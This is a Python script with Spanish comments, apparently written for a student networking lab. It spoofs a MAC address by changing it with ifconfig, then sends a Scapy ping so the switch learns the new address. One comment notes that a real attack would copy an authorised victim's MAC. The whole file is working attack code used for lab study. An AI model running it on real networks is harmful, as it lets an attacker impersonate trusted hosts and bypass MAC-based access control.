import subprocess
import re
import time
from scapy.all import *

# --- CONFIGURACIÓN ---
INTERFACE = "eth0" #cambiar a tu interfaz
# La MAC que quieres suplantar. 
# He puesto tu matrícula al final para la evidencia.
# En un ataque real, pondrías la MAC de una PC víctima autorizada.
NEW_MAC = "00:11:22:33:14:14" #poner la mac de tu preferencia
TARGET_IP = "10.14.14.1" # IP del Gateway (Router IOU)

def get_current_mac(iface):
    # Obtener la MAC actual usando ifconfig
    result = subprocess.check_output(["ifconfig", iface])
    # Regex para encontrar la MAC
    mac_search = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(result))
    if mac_search:
        return mac_search.group(0)
    else:
        print("[-] No se pudo leer la MAC actual.")
        return None

def change_mac(iface, new_mac):
    print(f"[!] Bajando interfaz {iface}...")
    subprocess.call(["ifconfig", iface, "down"])
    
    print(f"[!] Cambiando MAC a {new_mac}...")
    subprocess.call(["ifconfig", iface, "hw", "ether", new_mac])
    
    print(f"[!] Subiendo interfaz {iface}...")
    subprocess.call(["ifconfig", iface, "up"])

def force_switch_update(iface, ip_dst):
    # Usamos Scapy para enviar un Ping. 
    # Esto obliga al Switch a aprender la nueva MAC en tu puerto INMEDIATAMENTE.
    print(f"[+] Enviando paquete Scapy para actualizar Tabla CAM del Switch...")
    pkt = IP(dst=ip_dst)/ICMP()
    send(pkt, iface=iface, verbose=0)
    print("[+] Paquete enviado. El Switch ahora cree que somos la nueva MAC.")

if __name__ == "__main__":
    print("--- INICIANDO MAC SPOOFING (Matrícula: 2024-1414) ---")
    
    current_mac = get_current_mac(INTERFACE)
    print(f"[*] MAC Actual: {current_mac}")
    
    if current_mac != NEW_MAC:
        change_mac(INTERFACE, NEW_MAC)
        
        # Verificación
        updated_mac = get_current_mac(INTERFACE)
        if updated_mac == NEW_MAC:
            print(f"[SUCCESS] MAC cambiada exitosamente a: {updated_mac}")
            # Paso vital: Generar tráfico para que el switch se entere
            force_switch_update(INTERFACE, TARGET_IP)
        else:
            print("[ERROR] La MAC no se cambió. Revisa permisos de root.")
    else:
        print("[*] La MAC ya es la deseada. No se requieren cambios.")
